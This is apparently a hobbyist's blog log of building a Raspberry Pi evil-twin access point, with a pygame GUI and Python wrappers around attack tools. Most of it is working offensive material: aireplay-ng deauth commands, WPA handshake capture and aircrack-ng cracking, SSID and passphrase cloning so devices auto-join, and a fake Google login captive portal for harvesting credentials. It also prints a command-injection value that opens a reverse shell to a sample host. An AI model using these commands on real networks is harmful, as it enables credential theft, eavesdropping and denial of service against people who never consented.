# Disclaimer
This hacking tool is for educational, research and industry (if you really want to use it) purposes only. The tool is designed to demonstrate vulnerabilities in computer systems and networks, and should only be used on systems that you have explicit permission to test. Any unauthorised use of this tool is strictly prohibited and may be a violation of federal and/or state law.

I AM NOT responsible for any damage caused by the misuse of this tool. It is the responsibility of you, the user to ensure that they are complying with all applicable laws and regulations when using this tool. I take no liability for any actions taken by the user of this tool.

By downloading and using this tool, you agree to these terms and conditions. If you do not agree with these terms and conditions, you should not download or use this tool. - ChatGPT (I also changed a few things)

# Outline
Going to make the RPi a portable AP with deauthing capabilities. Both of these are already available on the RPi so to make this useful, I'm going to create a GUI for the 3.5in LCD display [link](https://www.jaycar.com.au/raspberry-pi-3-5in-touchscreen-lcd-with-stylus-and-enclosure/p/XC4631). There will also be options to save the capture, spoof the mac addr of both the deauthing device and AP and change the SSID of the AP (will also try to get this to be linked to the AP that is being deauthed for QoL.

# GUI
Going to create the GUI first using pygame, cause why not. Current idea is to have it display MAC addr, SSID and IP on the main page.

Going to develop this on computer then drop the python file when I think it will work. So have to remember not to make a window bigger than 480x320(pixel units).

```python
import pygame
import sys

def main():
    pygame.init()
    WINDOW_SIZE = (480 , 320)
    SSID = "Not an Evil Twin"
    MAC_ADDR = "aa:bb:cc:dd:ee:ff"
    FONT = pygame.font.Font(None,24)
    screen = pygame.display.set_mode(WINDOW_SIZE)
    pygame.display.set_caption("Wifi thingy")
    screen.fill((255, 255, 255)) # white color
    pygame.display.update()

    update_AP_info(SSID,MAC_ADDR,FONT,screen)
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT or (event.type ==pygame.KEYDOWN and event.key ==pygame.K_q):
                pygame.quit()
                sys.exit()


def update_AP_info(ssid:str,mac_addr:str,font:pygame.font.Font,window):
    text1 = f"SSID: {ssid}"
    text2 = f"Mac addr: {mac_addr}"
    draw_text(text1,(10,10),font,window)
    draw_text(text2,(10,30),font,window)
    pygame.display.update()


def draw_text(msg:str, location: tuple, font: pygame.font.Font, window):
    text = font.render(msg,True,(0,0,0))
    window.blit(text,location)
    
if __name__ == "__main__":
    main()
```

That's enough GUI for now.

It shows the current ssid and mac addr in the top left.

# evil-twin script
I have to be able to be able to update information and run this script from within python which I haven't done before.

(Link to the repo in case you have no idea what I'm talking about) [link](https://github.com/NickJongens/PiEvilTwin)

The bits I care about is the ssid and mac addr. The script sets a random mac addr:
```bash
ifconfig wlan0 down
macchanger -A wlan0
ifconfig wlan0 up
```

Instead of using `-A` you can use `--mac=aa:bb:cc:dd:ee:ff`

The ssid is the 5th line in the `hostapd.conf` file.
```
interface=wlan0
channel=6
hw_mode=g

ssid=Google Free WiFi

bridge=br0
auth_algs=1
wmm_enabled=0
```

## SSID
I could read in the entire file as a string, replace the ssid line and write it back out. yea can't think of a better idea so lets do that.
```python
def change_ssid(name: str):
    file = ''
    with open("./hostapd.conf",'r') as f:
        for line in f:
            if line.startswith("ssid"):
                file+=f"ssid={name}\n"
            else:
                file+=line
    with open("./hostapd.conf","w") as f:
        f.write(file)
```

Let's go it works!

## Mac addr
To please the appsec gods I'm going to regex the shit out of this as it is being pass as straight bash code. Why? so this doesn't happen

```
macchanger --mac=$mac_addr wlan0
```

Where mac_addr is:
```
aa:bb:cc:dd:ee:ff wlan0; sh -i >& /dev/tcp/10.10.10.69/9001 0>&1
```

which will just send off a root shell to someone.

Even tools designed to break things need to be secure. :)

### Regex lesson
Wow look perfect regex.
```python
import re

# Define the regular expression pattern for a MAC address
MAC_PATTERN = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'

# Check if a string matches the MAC address pattern
def is_valid_mac(mac_string):
    if re.match(MAC_PATTERN, mac_string):
        return True
    else:
        return False
```

Straight from chatgpt.

```
[0-9A-Fa-f]{2} # checks for hex pair
[:-] # then a semi colon
{5} # five times.
[0-9A-Fa-f]{2} # final hex pair

the ^ means starts with and $ means ends with.
```

### Change the mac addr
With the above check it can be done exactly the same as the ssid.
```python
def change_mac_addr(name: str):
	if is_valid_mac(name):
		update_file("./PiEvilTwinStart.sh",f"macchanger --mac={name} wlan0\n")
	else:
		return
```

Decided to make an update_file function cause its the same as ssid.
```python
def update_file(file_name: str, string: str):
    file = ''
    with open(file_name, 'r') as f:
        for line in f:
            if line.startswith(string[:4]):
                file+=string
            else:
                file+=line
    with open(file_name,'w') as f:
        f.write(file)
```

# Does this work?
I never tested the evil-twin script on the RPi. :skull:
```bash
apt-get install -y macchanger hostapd dnsmasq apache2 php

cp -f hostapd.conf /etc/hostapd/
cp -f dnsmasq.conf /etc/
cp -Rf html /var/www/

chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess

cp -f PiEvilTwinStart.sh /root/
crontab -l | { cat; echo "@reboot sudo sleep 10 && sudo sh /root/PiEvilTwinStart.sh && sudo service dnsmasq restart &"; } | crontab -

chmod +x /root/PiEvilTwinStart.sh
cp -f override.conf /etc/apache2/conf-available/
cd /etc/apache2/conf-enabled
ln -s ../conf-available/override.conf override.conf
cd /etc/apache2/mods-enabled

ln -s ../mods-available/rewrite.load rewrite.load
crontab -l | { cat; echo "@reboot sudo sleep 10 && sudo service dnsmasq restart &"; } | crontab -
exit 0
```

Going to remove the contabs as I dont want this to run on start.

Yep this works, very well. It's a valid google login page. To stop the browser freaking out about no ssl you can just add
```
address=/#/10.1.1.1
```

To the dnsmasq.conf file. This will cause the window to pop up instantly.

IDK how to stop this but doing a iptables flush and stopping both br0 and dnsmasq might do something.
```bash
ifconfig br0 down
iptables --flush
service dnsmasq stop
```

# Test 1
Before I figure out if the above works I want to test something I have been thinking of for a while. Will a device auto join to the evil twin.

## Setup
* Phone: hotspot
* laptop (with deauther abilities): deauther 
* RPi: evil-twin
* Nintendo switch: target

## Method
Sounds like a scientific report from highschool.

1. Turn the Hotspot on the phone on
2. Connect the Nintendo switch to the hotspot
3. Start monitor mode on the Laptop
4. Scan for the AP with airodump
5. Scan the AP for clients
6. Configure the Evil-twin to mimic the AP (Check Appendix A for more information)
7. Start the Evil-twin
8. Start the Deauth attack (Check appendix B for more information about the deauther)
9. Enter the observed results into a table.

## Hypothesis
(meant to be first but, no.)
The device shall connect automatically to the Evil-twin.

## Results
|ssid of AP|ssid of Evil Twin | mac addr of ap|mac addr of client|
|-|-|-|-|
|ElJay's iPhone|ElJay's iPhone|26:db:a3:d6:2b:19|58:2f:40:ce:5d:73|

Error with detecting AP.

## Discussion
First attempt nothing worked and my phone's hotspot kept turning off. Then the Evil-Twin was running when it shouldn't turns out the crontabs were still there.

Once all that was sorted I realised my laptop is dumb and wont deauth, So I tried to do both the deauth and AP on the RPi, and nothing happened. Last hope was to run it on linux server and this worked after some debugging. You can force set the channel on the wifi extender by using
```bash
iwconfig <interface> channel 6
```

But to make this even harder the hotspot won't stay on channel six. :mad:

The switch did not connect even with the evil-twin active. This could be due to the encryption type. As the iPhone will change the mac addr and the switch will still connect.

## Conclusion
No conclusion as the 'experiment' didn't work.

## Appendix A
Change the SSID to be the same as that of the AP by editing the `hostapd.conf` file.

## Appendix B
Start monitor mode:
`sudo airmon-ng start wlan1 `

Scan for AP:
`sudo airodump-ng wlan1mon`

Scan for device:
`sudo airodump-ng -d <mac_addr_of_AP> wlan1mon`

To run the deauth:
`sudo aireplay-ng  -0 0 -c <mad_addr_of_switch> -a <mac_addr_of_AP> wlan1mon`

# Recap
So the switch holds the ssid and does not care about the mac addr. New goal is to copy the encryption type, which means we will need the password of the AP. Which now makes things a bit more annoying. You could also just crack the password lol. [link](https://support.microsoft.com/en-us/windows/find-your-wi-fi-network-password-in-windows-2ec74b2e-d9ec-ade1-cc9b-bef1429cb678)

So get wifi password, then copy encryption to evil twin.

# Get wifi password
Already covered this in part 1
LOL Phone decided it should use wpa3 for no reason. (switch will still use wpa2-psk)
Deauth the device and start a capture.
```bash
sudo aireplay-ng  -0 0 -c <mad_addr_of_switch> -a <mac_addr_of_AP> wlan1mon
```

```bash
sudo airodump-ng -c 6 wlan1mon -w psk -d A6:99:42:94:34:7F
```

Stop the deauth and the capture should get a handshake.

where `-c 6` is the channel and `-d` is the AP

Crack the handshake
```bash
sudo aircrack-ng -w pwd.lst psk*.cap
```

Cool this gives the password.

# Upgrade security on evil-twin
Yep have an evil-twin that needs a password to join.

ChatGPT to the rescue. new hostapd.conf file.
```txt
interface=wlan0
channel=6
hw_mode=g

ssid=MyAccessPoint

bridge=br0
auth_algs=1
wmm_enabled=0

macaddr_acl=0
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=Password1
```

Needed to add the bridge and rearrange a few things to be in the same order as the EvilTwin script. Purely cause OCD.

# Test 2
No im not doing the whole report again.
## Switch
Check if the switch will connect to the evil-twin when the AP is not active. This will test if the SSID and wpa encryption is enough.

It would fool me but no the switch? Like why?

**10 min later**

Oh wpa3, thats right, well that kills the RPi. Can I use a laptop for an AP. (should be able to force WPA2)

Ha it uses WPA2.

LETS GO!! It shows up as a registered network.

## iPhone
So that was interesting, due to the popup which in the proper use, once valid creds are entered DNS will work. The iPhone connect to the AP (said trusted network) and then proceeded to disconnect say invalid password. Once entering the password (which is the same as the real network) the popup page showed wanting creds.

Without the DNS block thingy we run back into the browser being secure, however the device does auto join. So thats something.

Back to writing the Python application

# Implementing the above
So we dont need a mac addr instead we need to copy the encryption and password of the AP. The password being gained by either grabbing a wifi handshake or other means.

Just going to write out the python code and explain only what is very cryptic.

## Start and Stop monitor mode
Get the adaptor:
```python
def get_wifi_adaptor() -> str:
    p = subprocess.Popen(["sudo","airmon-ng"],stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    name = p.stdout.readlines()[3].decode().split()[1]
    return name

def start_monitor_mode(name) -> str:
    p = subprocess.Popen(["sudo","airmon-ng","start",name],stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    new_name = p.stdout.readlines()[-3].decode().split("]")[1].strip() #weird list magic to get the name (I cant write comments :) )
    time.sleep(.1)
    p.terminate()
    return new_name

def stop_monitor_mode(name):
    p = subprocess.Popen(["sudo","airmon-ng","stop",name],stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(.1)
    p.terminate()
```

# Scan for AP's
I thought this was going to be a lot easier. Turns out airodump does not like running in a process. So instead of just reading out the lines as it prints them (very bad idea) I finally figured out saving it to a file is easier.
```python
def scan_aps(name, times,file_name):
    p = subprocess.Popen(["sudo","timeout",f"{times}s","airodump-ng",name,"-w","/home/eljay/"+file_name,"-o","csv"],stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(6)
    p.terminate()
    return

def get_aps(file_name) -> dict:
    aps = {}
    with open(f"/home/eljay/{file_name}-01.csv") as file:
        for line in file:
            if "Probed" in line:
                break
            elif "BSSID" in line or line =="\n":
                pass
            else:
                bssid = line.split(',')[0]
                ssid = line.split(',')[-2].strip()
                enc = line.split(',')[5:8]
                if ssid !='':
                    aps[ssid] = [bssid,enc]
    return aps
def delete_file(file_name):
    p = subprocess.Popen(["sudo","rm",f"./{file_name}-01.csv"])
```

# Mimic AP
Already have a change ssid function.

For the encryption I pretty sure you just need to add this:
```txt
macaddr_acl=0
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=Password1
```

And just swap out the password for the one that has been captured.
```python
def add_wpa2(password):
    with open('./hostapd.conf', 'a') as f:
        for line in f:
            if 'wpa' in line:
                return
        f.write("\nmacaddr_acl=0\n")
        f.write("ignore_broadcast_ssid=0\n")
        f.write("wpa=2\n")
        f.write("wpa_key_mgmt=WPA-PSK\n")
        f.write("rsn_pairwise=CCMP\n")
        f.write(f"wpa_passphrase={password}\n")
```

This can be done a better way, I just can't be bothered to fix it right now.

# Next time
So this blog is kinda long so just going to abruptly stop here (soz).

**Things to add / do**
* The gui - I started it then kinda forgot about it
* Deauthing functionality
* Fix the spaghetti code

Not going to publish the code as it isn't finished yet.

FIN